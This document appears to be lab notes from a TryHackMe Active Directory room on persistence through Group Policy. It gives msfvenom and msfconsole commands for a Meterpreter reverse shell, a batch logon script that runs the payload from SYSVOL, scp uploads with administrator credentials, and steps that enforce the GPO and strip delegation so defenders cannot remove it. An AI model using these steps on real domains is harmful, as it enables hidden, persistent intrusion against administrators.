## Persistence through GPOs
---
Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes configuration such as membership to restricted groups, firewall and AV configuration, and which scripts should be executed upon startup.

- Restricted Group Membership - This could allow us administrative access to all hosts in the domain
- Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain.

### Domain Wide Persistence
---
Creating a GPO that is linked to the Admins OU, which will allow us to get  ashell on host every time one of them authenticates to a host.

The shell, the listener, and the actual bat file:

```C
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
```

Windows allows us to execute Batch or PowerShell scripts through the logon GPO. Batch scripts are often more stable than PowerShell scripts so create one that will copy your executable to the host and execute it once a user authenticates.

```C
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe
```

The script will copy the binary from the SYSVOL directory to the local machine, then wait 20 seconds, before finally executing the binary.

You can use SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:

```C
scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Next:

```C
scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Start your MSF Listener:

```C
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
```

### GPO Creation
---
Make sure to use `runas administrator`:

The first step uses your Domain Admin account to open the Group Policy Management snap-in:

1. In your runas-spawned terminal, type MMC and press enter.
2. Click on **File**->**Add/Remove Snap-in...**
3. Select the **Group Policy Management** snap-in and click **Add**
4. Click **OK**

[Image 1]

Write a GPO that will be appled to all Admins, o right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as `username - persisting GPO`:

[Image 2]

Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can right-click on your policy and select edit:

[Image 3]

 Go back to your Group Policy Management Editor:  

1. Under User Configuration, expand **Policies->Windows Settings**.
2. Select **Scripts (Logon/Logoff)**.
3. Right-click on **Logon->Properties**
4. Select the **Scripts** tab.
5. Click **Add->Browse**.

 Navigate to where we stored our Batch and binary files:

[Image 4]

Run your msfconsole:

```C
run
```

Note: You need to create a Logon event for the GPO to execute. If you just closed your RDP session, that only performs a disconnect which means it would not trigger the GPO. Make sure to select navigate to sign out as shown below in order to terminate the session. This will ensure that a Logon event is generated when you reauthenticate:

[Image 5]

#### Hiding in Plain Sight
---
Hardening our persistence. Back to your MMC windows, click on your policy then click on Delegation:

[Image 6]

By default, all administrators have the ability to edit GPOs. Let's remove these permissions:

1. **Right-Click** on **ENTERPRISE DOMAIN CONTROLLERS** and select **Edit settings, delete, modify security**.
2. **Click** on all other groups (except Authenticated Users) and click **Remove**.

You should be left with delegation that looks like this:

[Image 7]

Click on Advanced and remove the Created Owner from the permissions:

[Image 8]

By default, all authenticated Users must have the ability to read the policy. This is required because otherwise, the policy could not be read by the user's account when they authenticate to apply User policies.


